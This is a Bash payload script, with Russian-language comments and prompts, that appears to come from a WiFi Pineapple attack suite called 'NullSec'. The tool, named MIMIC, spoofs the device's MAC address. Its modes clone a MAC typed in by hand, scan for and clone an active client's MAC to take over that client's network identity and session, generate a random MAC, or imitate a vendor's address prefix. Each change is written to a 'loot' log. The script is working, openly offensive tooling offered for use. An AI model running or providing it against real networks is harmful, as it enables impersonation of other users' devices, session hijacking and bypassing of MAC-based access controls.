#!/bin/bash
. /root/payloads/library/nullsec-ui.sh
#═══════════════════════════════════════════════════════════════════════════════
# MIMIC - Контроллер подмены и манипуляции MAC-личностью
# Разработано: bad-antics
# 
# Клонирует любое устройство в сети — стань им, унаследуй доступ
#═══════════════════════════════════════════════════════════════════════════════

# Автоматически определяет правильный беспроводной интерфейс (экспортирует $IFACE).
# При отсутствии интерфейса показывает диалог ошибки.
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
nullsec_require_iface || exit 1

source /mmc/nullsec/lib/nullsec-scanner.sh 2>/dev/null

LOOT_DIR="/mmc/nullsec/mimic"
mkdir -p "$LOOT_DIR"

PROMPT "    ╔╦╗╦╔╦╗╦╔═╗
    ║║║║║║║║║  
    ╩ ╩╩╩ ╩╩╚═╝
━━━━━━━━━━━━━━━━━━━━━━━━━
Модуль кражи личности

Стань кем угодно
в сети. Склонируй их
MAC, укради их сессию.

ОБРАЗ ПЕРЕМЕНЫ
━━━━━━━━━━━━━━━━━━━━━━━━━
Разработано: bad-antics"

PROMPT "РЕЖИМЫ MIMIC:

1. Клонировать конкретный MAC
   (Вы выбираете)

2. Клонировать активного клиента
   (Автоопределение)

3. Рандомный MAC
   (Новая личность)

4. Подмена производителя
   (Выглядеть как устройство)"

MODE=$(NUMBER_PICKER "Режим (1-4):" 2)
INTERFACE="$IFACE"
ORIGINAL_MAC=$(cat /sys/class/net/$INTERFACE/address 2>/dev/null)

LOOT_FILE="$LOOT_DIR/mimic_$(date +%Y%m%d_%H%M%S).txt"
cat > "$LOOT_FILE" << EOF
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 MIMIC - Журнал смены личности
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 Оригинальный MAC: $ORIGINAL_MAC
 Режим: $MODE
 Запущено: $(date)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 NullSec Pineapple Suite | Разработано: bad-antics
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

EOF

# Префиксы производителей
declare -A VENDORS=(
    ["Apple"]="00:1A:2B"
    ["Samsung"]="00:26:37"
    ["Intel"]="00:1B:21"
    ["Microsoft"]="00:50:F2"
    ["Cisco"]="00:1A:A1"
    ["Google"]="F4:F5:D8"
    ["Amazon"]="00:FC:8B"
    ["Roku"]="B0:A7:37"
)

generate_random_mac() {
    printf '%02x:%02x:%02x:%02x:%02x:%02x\n' \
        $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) \
        $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256))
}

change_mac() {
    local NEW_MAC="$1"
    ifconfig $INTERFACE down
    ifconfig $INTERFACE hw ether "$NEW_MAC"
    ifconfig $INTERFACE up
    echo "[$(date)] Сменил MAC на: $NEW_MAC" >> "$LOOT_FILE"
}

case $MODE in
    1) # Ручной ввод MAC
        TARGET_MAC=$(TEXT_PICKER "Введите MAC:" "XX:XX:XX:XX:XX:XX")
        if [[ "$TARGET_MAC" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
            NEW_MAC="$TARGET_MAC"
        else
            ERROR_DIALOG "Неверный формат MAC!"
            exit 1
        fi
        ;;
    2) # Клонировать активного клиента
        LOG "Сканирую клиентов..."
        SPINNER_START "Ищу активных клиентов..."
        
        nullsec_select_target
        [ -z "$SELECTED_BSSID" ] && { ERROR_DIALOG "Цель не найдена!"; exit 1; }
        
        nullsec_select_client
        NEW_MAC="$SELECTED_CLIENT"
        
        SPINNER_STOP
        [ -z "$NEW_MAC" ] && { ERROR_DIALOG "Клиент не найден!"; exit 1; }
        ;;
    3) # Случайный MAC
        NEW_MAC=$(generate_random_mac)
        ;;
    4) # Подмена производителя
        PROMPT "СПИСОК ПРОИЗВОДИТЕЛЕЙ:
1. Apple
2. Samsung
3. Intel
4. Microsoft
5. Cisco
6. Google
7. Amazon
8. Roku"
        VENDOR_NUM=$(NUMBER_PICKER "Производитель (1-8):" 1)
        case $VENDOR_NUM in
            1) PREFIX="00:1A:2B" ;;
            2) PREFIX="00:26:37" ;;
            3) PREFIX="00:1B:21" ;;
            4) PREFIX="00:50:F2" ;;
            5) PREFIX="00:1A:A1" ;;
            6) PREFIX="F4:F5:D8" ;;
            7) PREFIX="00:FC:8B" ;;
            8) PREFIX="B0:A7:37" ;;
        esac
        SUFFIX=$(printf '%02x:%02x:%02x\n' $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)))
        NEW_MAC="${PREFIX}:${SUFFIX}"
        ;;
esac

CONFIRMATION_DIALOG "ПРЕВРАТИТЬСЯ В:
$NEW_MAC

Это изменит
ваш MAC-адрес.

Сеть будет сброшена.

Продолжить?"
[ $? -ne 0 ] && exit 0

LOG "Преобразую..."
SPINNER_START "Меняю личность..."

change_mac "$NEW_MAC"
sleep 2

SPINNER_STOP

CURRENT_MAC=$(cat /sys/class/net/$INTERFACE/address 2>/dev/null)

cat >> "$LOOT_FILE" << EOF
ПРЕОБРАЖЕНИЕ ЗАВЕРШЕНО
Новый MAC: $CURRENT_MAC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 NullSec Pineapple Suite | Разработано: bad-antics
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
EOF

if [ "$CURRENT_MAC" = "$NEW_MAC" ]; then
    PROMPT "MIMIC ЗАВЕРШЕН
━━━━━━━━━━━━━━━━━━━━━━━━━
Личность изменена!

Было: $ORIGINAL_MAC
Стало: $CURRENT_MAC

Теперь вы другой
в сети.

Чтобы восстановить:
Запустите MIMIC снова с
оригинальным MAC.
━━━━━━━━━━━━━━━━━━━━━━━━━
Разработано: bad-antics"
else
    ERROR_DIALOG "Смена MAC не удалась!
Текущий: $CURRENT_MAC"
fi
